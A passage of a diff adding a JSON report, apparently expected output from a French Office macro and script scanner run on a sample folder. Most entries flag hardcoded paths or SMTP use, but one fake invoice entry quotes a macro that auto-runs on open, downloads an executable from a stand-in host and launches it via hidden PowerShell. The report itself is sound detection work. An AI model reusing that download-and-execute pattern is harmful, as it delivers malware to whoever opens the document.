+   "empreinteProjet": "b1a1c63cea158757",
+   "constats": [
+    {
+     "regle": "B64-003",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "MSComCtl2 — C:\\Windows\\SysWOW64\\MSCOMCT2.OCX"
+    },
+    {
+     "regle": "B64-003",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "MSComctlLib — C:\\Windows\\SysWOW64\\MSCOMCTL.OCX"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 3,
+     "extrait": "ThisWorkbook.SaveCopyAs \"S:\\RH\\Archives\\\" & Format(Now, \"yyyymmdd\") & \"_planning.xlsm\"",
+     "module": "modArchive"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 4,
+     "extrait": "Workbooks.Open \"C:\\Users\\mdupont\\Documents\\parametres.xlsx\"",
+     "module": "modArchive"
+    },
+    {
+     "regle": "PRJ-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    }
+   ],
+   "erreurs": [],
+   "taille": 4751,
+   "modifieDisque": "2025-09-02T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Scripts/connexion.vbs",
+   "famille": "script",
+   "extension": "vbs",
+   "format": "texte",
+   "macros": true,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "connexion",
+     "protege": false,
+     "references": [],
+     "modules": [
+      {
+       "nom": "connexion",
+       "type": "script",
+       "lignes": 3,
+       "lignesCode": 2,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "4494a070b5615737"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "WScript.Network"
+   ],
+   "lignesCode": 2,
+   "empreinteProjet": "7fc082dbe9928b8b",
+   "constats": [
+    {
+     "regle": "VBS-010",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 2,
+     "extrait": "reseau.MapNetworkDrive \"S:\", \"\\\\srv-fichiers\\commun\"",
+     "module": "connexion"
+    }
+   ],
+   "erreurs": [],
+   "taille": 100,
+   "modifieDisque": "2025-12-26T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Scripts/sauvegarde_nuit.vbs",
+   "famille": "script",
+   "extension": "vbs",
+   "format": "texte",
+   "macros": true,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "sauvegarde_nuit",
+     "protege": false,
+     "references": [],
+     "modules": [
+      {
+       "nom": "sauvegarde_nuit",
+       "type": "script",
+       "lignes": 3,
+       "lignesCode": 2,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "4177d235c2fc8914"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "Scripting.FileSystemObject"
+   ],
+   "lignesCode": 2,
+   "empreinteProjet": "9f346034ad632ffa",
+   "constats": [
+    {
+     "regle": "VBS-010",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 2,
+     "extrait": "fso.CopyFolder \"D:\\Donnees\", \"\\\\srv-sauvegarde\\nuit\\\", True",
+     "module": "sauvegarde_nuit"
+    }
+   ],
+   "erreurs": [],
+   "taille": 115,
+   "modifieDisque": "2021-05-06T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Téléchargements/Facture_2024_0172.docm",
+   "famille": "word",
+   "extension": "docm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "Utilisateur",
+    "dernierAuteur": "Utilisateur",
+    "modifie": "2024-12-02T07:12:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisDocument",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "NewMacros",
+       "type": "module",
+       "lignes": 8,
+       "lignesCode": 7,
+       "procedures": 1,
+       "declares": 1,
+       "empreinte": "7fc919ed99e2c6ae"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 7,
+   "empreinteProjet": "664aa627142bf6d5",
+   "constats": [
+    {
+     "regle": "SEC-010",
+     "module": "(projet)",
+     "ligne": 0,
+     "extrait": "ouverture + téléchargement + commande"
+    },
+    {
+     "regle": "SEC-001",
+     "ligne": 6,
+     "extrait": "Shell \"powershell -w hidden -c Start-Process \" & chemin, vbHide",
+     "module": "NewMacros"
+    },
+    {
+     "regle": "SEC-002",
+     "ligne": 1,
+     "extrait": "Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As",
+     "module": "NewMacros"
+    },
+    {
+     "regle": "SEC-002",
+     "ligne": 5,
+     "extrait": "URLDownloadToFile 0, \"http://exemple.invalid/maj.exe\", chemin, 0, 0",
+     "module": "NewMacros"
+    },
+    {
+     "regle": "SEC-003",
+     "ligne": 2,
+     "extrait": "Sub AutoOpen()",
+     "module": "NewMacros"
+    }
+   ],
+   "erreurs": [],
+   "taille": 3345,
+   "modifieDisque": "2024-07-19T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Informatique/Outils/Relances/App.config",
+   "famille": "config",
+   "extension": "config",
+   "format": "texte",
+   "courriel": {
+    "mecanismes": [
+     "MEL-001"
+    ],
+    "envoiDirect": 0,
+    "affichage": 0,
+    "piecesJointes": 0,
+    "lectureBoite": 0
+   },
+   "macros": false,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [],
+   "progIds": [],
+   "lignesCode": 0,
+   "empreinteProjet": null,
+   "constats": [
+    {
+     "regle": "MEL-001",
+     "module": "(source)",
+     "ligne": 4,
+     "extrait": "<add key=\"SmtpServeur\" value=\"smtp.office365.com\" />"
+    }
+   ],
+   "erreurs": [],
+   "taille": 276,
+   "modifieDisque": "2023-05-09T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Informatique/Outils/Relances/Envoi.cs",
+   "famille": "dotnet",
+   "extension": "cs",
+   "format": "texte",
+   "courriel": {
+    "mecanismes": [
+     "MEL-001"
+    ],
+    "envoiDirect": 1,
+    "affichage": 0,
+    "piecesJointes": 1,
+    "lectureBoite": 0
+   },
+   "macros": false,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [],
+   "progIds": [],
+   "lignesCode": 0,
+   "empreinteProjet": null,
+   "constats": [
+    {
+     "regle": "MEL-001",
+     "module": "(source)",
+     "ligne": 10,
+     "extrait": "using var client = new SmtpClient(\"smtp.office365.com\", 587)"
+    }
+   ],
+   "erreurs": [],
+   "taille": 661,
+   "modifieDisque": "2021-07-22T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Informatique/Outils/Relances/Relances.csproj",
+   "famille": "dotnet",
+   "extension": "csproj",
+   "format": "texte",
+   "courriel": {
+    "mecanismes": [
+     "OUT-001"
+    ],
+    "envoiDirect": 0,
+    "affichage": 0,
+    "piecesJointes": 0,
+    "lectureBoite": 0
+   },
+   "macros": false,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [],
+   "progIds": [],
+   "lignesCode": 0,
+   "empreinteProjet": null,
+   "constats": [
+    {
+     "regle": "OUT-001",
+     "module": "(source)",
+     "ligne": 7,
+     "extrait": "<Reference Include=\"Microsoft.Office.Interop.Outlook, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\" />"
+    }
+   ],
+   "erreurs": [],
+   "taille": 321,
+   "modifieDisque": "2024-10-16T09:00:00.000Z"
+  }
+ ],
+ "nonAnalyses": [],
+ "sansMacro": {
+  "xlsx": 7,
+  "pptx": 1,
+  "docx": 2
+ },
+ "annexesLues": {
+  "config": 1,
+  "dotnet": 3
+ },
+ "inaccessibles": [],
+ "tropGros": []
+}
